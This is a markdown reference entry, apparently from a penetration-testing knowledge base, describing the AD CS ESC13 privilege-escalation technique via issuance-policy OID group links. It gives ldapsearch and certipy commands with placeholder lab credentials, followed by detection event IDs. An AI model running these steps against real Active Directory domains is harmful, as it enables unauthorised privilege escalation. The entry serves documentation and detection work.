---
id: adcs_esc13
type: technique
label: "AD CS ESC13 (issuance-policy group mapping)"
phase: "privesc"
tools: ["certipy", "certify"]
cve: null
detect: "Review issuance-policy OID mappings and correlate issued policies with certificate-authentication and authorization decisions."
mitre: "T1649"
tag: null
---


# AD CS ESC13 (issuance-policy group mapping)

### Affected object / attribute
**`msDS-OIDToGroupLink`** linking an issuance policy OID to a privileged group.

### Concept (deep)
A certificate from the linked template grants the **group’s privileges in the token**.

### Commands
```bash
# ── Enumerate the OID group link ─────────────────────────────────────
ldapsearch -H ldap://10.10.10.5 -x -D 'lowpriv@corp.local' -w 'Password123!' \
  -b "CN=OID,CN=Public Key Services,CN=Services,DC=corp,DC=local" \
  msDS-OIDToGroupLink

# ── Request the linked template ──────────────────────────────────────
certipy req -u lowpriv@corp.local -p 'Password123!' \
  -ca CORP-CA -template LinkedTemplate
```

### Detection
OID group links to **Domain Admins/EA**; **5136** on OID objects; **4886** for the policy template.

---
